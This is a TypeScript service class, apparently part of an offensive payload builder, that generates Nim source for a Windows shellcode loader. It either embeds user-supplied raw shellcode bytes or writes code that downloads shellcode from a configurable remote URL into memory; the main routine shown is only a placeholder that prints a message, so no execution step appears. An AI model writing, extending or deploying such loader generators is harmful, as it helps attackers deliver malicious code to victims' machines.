import { PayloadRequest } from '../schemas/payload.schema';

export class PayloadService {

    generateSource(config: PayloadRequest): string {
        const imports = ['winim/lean'];
        if (config.shellcode_url) {
            imports.push('puppy');
        }

        const shellcodeBlock = this.generateShellcodeBlock(config);

        return `
import ${imports.join(', ')}

${shellcodeBlock}

proc main() =
    # Main entry point placeholder
    echo "Payload loaded"

main()
`;
    }

    private generateShellcodeBlock(config: PayloadRequest): string {
        if (config.shellcode) {
            // Raw shellcode case
            // Input: "0xfc,0x48,..."
            // Expected: var shellcode: array[SIZE, byte] = [...]

            const shellcodeStr = config.shellcode.trim();
            // Count bytes by splitting by comma
            const bytes = shellcodeStr.split(',').filter(s => s.trim().length > 0);
            const size = bytes.length;

            return `var shellcode: array[${size}, byte] = [${shellcodeStr}]`;
        }
        else if (config.shellcode_url) {
            // URL case using puppy
            return `
proc extractShellCodeWithHttp(): string =
    try:
        result = fetch("${config.shellcode_url}")
        return result
    except PuppyError as e:
        echo "Erreur HTTP: ", e.msg
        return ""

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

# Initialize shellcode on heap for HTTP
let shellcodeStr = extractShellCodeWithHttp()
var shellcode: seq[byte] = toByteSeq(shellcodeStr)
`;
        }

        // Should catch by validation, but just in case
        return "";
    }
}
